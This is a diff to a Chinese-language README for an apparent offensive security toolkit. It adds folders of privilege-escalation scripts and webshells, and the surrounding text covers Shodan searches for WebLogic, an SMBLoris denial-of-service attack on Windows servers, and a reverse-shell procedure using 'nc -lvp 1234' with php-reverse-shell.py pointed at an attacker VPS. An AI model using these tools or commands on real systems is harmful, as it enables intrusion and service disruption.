@@ -10,6 +10,14 @@ shodancount.py weblogic
 
 shodansearch.py weblogic
 
+# LPE
+
+里面放了常用的提权脚本
+
+# webshell
+
+里面放了个人常用的webshell
+
 # SMBLoris 通过smb服务对Windows服务器实施DOS攻击
 
 chmod +x run10.sh
@@ -53,5 +61,7 @@ nc -lvp 1234
 把php-reverse-shell.py上传到被攻击的机器上,指定攻击机器地址和端口执行即可
 
 php-reverse-shell.py vps地址 1234
+
+还有一份个人总结的渗透测试思维导图
 
 # Hope you enjoy ^_^
